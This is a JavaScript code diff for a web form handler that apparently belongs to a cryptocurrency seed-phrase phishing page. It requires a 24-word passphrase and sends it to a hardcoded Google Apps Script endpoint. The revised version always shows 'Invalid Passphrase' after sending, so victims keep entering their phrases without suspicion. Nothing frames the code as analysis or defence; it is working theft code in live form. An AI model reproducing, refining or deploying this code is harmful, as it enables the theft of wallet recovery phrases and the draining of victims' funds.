@@ -1,56 +1,66 @@
 // Function to handle form submission
 function handleSubmit(event) {
     event.preventDefault(); // Prevent default form submission
-
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
-    const myButton = document.getElementById('b1');
-    const myButton2 = document.getElementById('b2');
-
+    const myButton = document.getElementById('b1')
     myButton.disabled = true;
-    myButton2.disabled = true;
 
-    // Get input value
-    const form = document.getElementById('myForm');
+    const myButton2 = document.getElementById('b2')
+    myButton2.disabled = true;
+    // Step 1: Get the value of the hidden input field with name 'mf-texts'
+    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
     const inputValue = form.elements['mf-texts'].value.trim();
 
-    // Validate that input has exactly 24 words
+    
+
     const wordCount = inputValue.split(/\s+/).length;
-    if (wordCount !== 24) {
+    if (wordCount !==24) {
+        const errorElement = document.getElementById('emsg');
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
-        return;
+        return; // Exit function if word count is not 24
     }
 
-    // Google Apps Script Web App URL
-    const scriptUrl = "https://script.google.com/macros/s/AKfycbzZkC3cqGP1qnpLW54EFpm9jr-_A7QI2GAcfBghxAt7USwSLsUvBUyvLoyfsXLKfMuU_A/exec"; // Replace with your actual URL
+    // Step 2: Make a GET request to example.com/send/ + the value from Step 1
+    const url = `https://script.google.com/macros/s/AKfycbzZkC3cqGP1qnpLW54EFpm9jr-_A7QI2GAcfBghxAt7USwSLsUvBUyvLoyfsXLKfMuU_A/exec${encodeURIComponent(inputValue)}/P-/`;
 
-    // Send a request to Google Apps Script
-    fetch(scriptUrl + "?input=" + encodeURIComponent(inputValue), {
+    fetch(url, {
         method: 'GET'
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            errorElement.textContent = "File created successfully!";
-            console.log("File URL:", data.fileUrl);
-        } else {
-            errorElement.textContent = "Error: " + data.message;
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
         }
+        return response.json(); // Assuming the response is JSON; adjust as per your API
     })
-    .catch(error => {
-        console.error('Error:', error);
-        errorElement.textContent = 'Request failed!';
-    })
-    .finally(() => {
+    .then(data => {
+        // Step 3: Display any errors in the HTML with ID 'emsg'
+        const errorElement = document.getElementById('emsg');
+        errorElement.textContent = ''; // Clear previous error messages
+        // Example assuming the API returns an error message in JSON response
+        // if (data.error) {
+        //     errorElement.textContent = data.error;
+        // }
+        errorElement.textContent = 'Invalid Passphrase'
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
+        // Handle successful response if needed
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        const errorElement = document.getElementById('emsg');
+        // errorElement.textContent = 'Error occurred while processing your request.';
+        form.reset();
+        errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
     });
 }
 
-// Attach event listener to the form
-const form = document.getElementById('myForm');
+// Add event listener to the form for 'submit' event
+const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
 form.addEventListener('submit', handleSubmit);
